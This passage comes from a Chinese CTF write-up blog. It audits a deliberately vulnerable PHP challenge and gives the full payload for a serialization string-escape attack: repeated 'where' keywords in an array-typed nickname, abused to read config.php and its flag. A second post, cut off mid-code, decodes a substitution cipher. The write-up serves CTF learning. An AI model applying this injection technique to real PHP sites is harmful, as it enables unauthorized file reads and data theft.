class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>profile.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>); 		关键函数</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>UPDATE.PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>INDEX.PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>CONFIG.PHP</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;;</span><br><span class="line">	$config[&#x27;username&#x27;] = &#x27;root&#x27;;</span><br><span class="line">	$config[&#x27;password&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$config[&#x27;database&#x27;] = &#x27;&#x27;;</span><br><span class="line">	$flag = &#x27;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>大量的代码审计<br>存在两个敏感函数<code>unserialize</code>和<code>file_get_contents</code>，在profile.php中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&#x27;class.php&#x27;);</span><br><span class="line">	$username = $_SESSION[&#x27;username&#x27;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">		$profile = unserialize($profile); 		关键函数</span><br><span class="line">		$phone = $profile[&#x27;phone&#x27;];</span><br><span class="line">		$email = $profile[&#x27;email&#x27;];</span><br><span class="line">		$nickname = $profile[&#x27;nickname&#x27;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>想到config中有个被抹掉的flag，如果可以通过photo打开config文件，是不是就可以拿到flag了呢。<br>有了目标继续审计代码<br>可以看到<code>user</code>中应当有被序列化的字符串，根据username取出后，在profile中解码，转化为信息。<br>查看class.php，这里面写了一个父类<code>mysql</code>和一个子类<code>user</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">几个关键的传参函数</span><br><span class="line">	@user</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    @mysql</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>显然profile对象是以序列化后的字符串存储在数据库中的<br>查看profile的输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;];</span><br><span class="line">$profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;];</span><br><span class="line">$profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;];</span><br><span class="line">$profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]);</span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>
<p>photo的过滤函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file = $_FILES[&#x27;photo&#x27;];</span><br><span class="line">		if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000)</span><br><span class="line">			die(&#x27;Photo size error&#x27;);</span><br><span class="line">		move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]));</span><br></pre></td></tr></table></figure>
<p>可惜photo的值无法被自定义，因此需要使用序列化的拼接<br>之前的过滤函数也给了这一步的暗示<br>同时利用字符替换中字节的溢出使得更改后的photo值符合自动生成的序列化的s值<br>这也正式我们可以利用的地方，因为我们想让“”;}s:5:“photo”;s:10:“config.php”;”被拼接在反序列化字符串里，而不是被当做nickname的值。因为“”;}s:5:“photo”;s:10:“config.php”;}”是34个字符。那么我们就传递34个where，在序列化后，存入数据库时，会把where变成hacker，长度加一。这样代表nickname的“s”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">		$safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;);</span><br><span class="line">		$safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;;</span><br><span class="line">		return preg_replace($safe, &#x27;hacker&#x27;, $string);</span><br><span class="line">每替换一个`where`为`hacker`就可以补充一个字符</span><br></pre></td></tr></table></figure>
<p>思考对nickename的绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10)</span><br><span class="line">			die(&#x27;Invalid nickname&#x27;);</span><br></pre></td></tr></table></figure>
<p><em>php数组绕过利用</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(Array()) = null</span><br><span class="line">sha1(Array()) = null</span><br><span class="line">ereg(pattern,Array()) =null</span><br><span class="line">preg_match(pattern,Array()) = false</span><br><span class="line">strcmp(Array(), “abc”) =null</span><br><span class="line">strpos(Array(),“abc”) = null</span><br><span class="line">strlen(Array()) = null</span><br></pre></td></tr></table></figure>
<p>传入数组就可以同时绕过两个判断<br>这是我们需要传入的nickename值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>转到profile页面后成功得到config.php的源码。</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/4-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/31/4-7/" class="post-title-link" itemprop="url">4-7</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-31 10:40:01" itemprop="dateCreated datePublished" datetime="2022-03-31T10:40:01+08:00">2022-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-06 18:27:10" itemprop="dateModified" datetime="2022-04-06T18:27:10+08:00">2022-04-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="字符替换解码"><a href="#字符替换解码" class="headerlink" title="字符替换解码"></a>字符替换解码</h2><p>下载flag.txt<br>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EKSZJTCMXOQUDYLFABGPHNRVIW </span><br><span class="line"></span><br><span class="line">Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj</span><br><span class="line">tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep</span><br><span class="line">pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp</span><br><span class="line">lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e</span><br><span class="line">ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj</span><br><span class="line">effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz,</span><br><span class="line">peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxly</span><br><span class="line">bjgfjspxyc xp.</span><br><span class="line"></span><br><span class="line">Pmj tuec xg: fxslSPT&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;</span><br></pre></td></tr></table></figure>
<p>根据密钥key对文件解码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key=&#x27;EKSZJTCMXOQUDYLFABGPHNRVIW&#x27;</span><br><span class="line"></span><br><span class="line">aim=&#x27;Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz, peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg 